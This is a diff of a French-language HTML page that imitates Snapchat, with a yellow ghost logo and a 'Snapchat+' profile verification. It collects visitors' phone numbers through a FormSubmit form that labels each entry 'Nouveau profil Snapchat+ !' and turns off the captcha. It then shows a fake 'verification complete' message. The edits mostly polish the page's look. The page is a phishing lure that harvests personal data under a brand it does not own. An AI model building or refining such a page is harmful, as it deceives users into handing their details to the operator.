@@ -9,8 +9,11 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* Tu pourras mettre ton image de fond ici plus tard */
-            background-color: #ffffff; 
+            /* C'est ici que ton image fond.jpg va s'afficher */
+            background-image: url('fond.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,6 +25,10 @@
             max-width: 400px;
             padding: 20px;
             text-align: center;
+            /* Petit fond blanc semi-transparent pour que le texte reste lisible sur ton image */
+            background-color: rgba(255, 255, 255, 0.9); 
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
         /* Zone du logo */
@@ -29,7 +36,6 @@
             width: 120px;
             height: 120px;
             margin: 0 auto 20px auto;
-            /* On garde le fond jaune si l'image ne charge pas */
             background-color: #FFFC00;
             border-radius: 25px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
@@ -40,7 +46,7 @@
         }
 
         .snap-logo img {
-            width: 80%; /* Taille du fantôme par rapport au carré jaune */
+            width: 80%;
             height: 80%;
             object-fit: contain;
         }
@@ -80,6 +86,7 @@
             box-sizing: border-box;
             outline: none;
             transition: border-color 0.3s;
+            background-color: #fff;
         }
 
         input:focus {
@@ -139,11 +146,9 @@
                     <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                 </div>
 
-                <!-- Configuration Formsubmit -->
                 <input type="hidden" name="_subject" value="Nouveau profil Snapchat+ !">
                 <input type="hidden" name="_captcha" value="false">
-                <!-- Redirection après soumission (optionnel, garde la page ou va vers une page blanche) -->
-                <input type="hidden" name="_next" value=""> 
+                <input type="hidden" name="_next" value="">
 
                 <button type="submit" class="btn-submit">Vérifier</button>
             </form>
@@ -174,24 +179,20 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Gestion de l'étape 1 -> 2
             const form1 = document.querySelector('#step-1 form');
             const step2 = document.getElementById('step-2');
             
             form1.addEventListener('submit', function(e) {
-                // Petite animation de transition
                 setTimeout(() => {
                     document.getElementById('step-1').style.display = 'none';
                     step2.style.display = 'block';
                 }, 800);
             });
 
-            // Si tu veux cacher le formulaire après la soumission de l'étape 2 aussi
             const form2 = document.querySelector('#step-2 form');
             form2.addEventListener('submit', function() {
                 setTimeout(() => {
                     document.getElementById('step-2').style.display = 'none';
-                    // Afficher un message de fin ou rester sur la page
                     document.querySelector('.container').innerHTML = "<h1>Vérification terminée !</h1><p>Votre profil est en cours d'activation.</p>";
                 }, 1000);
             });
@@ -199,4 +200,3 @@
     </script>
 </body>
 </html>
-            
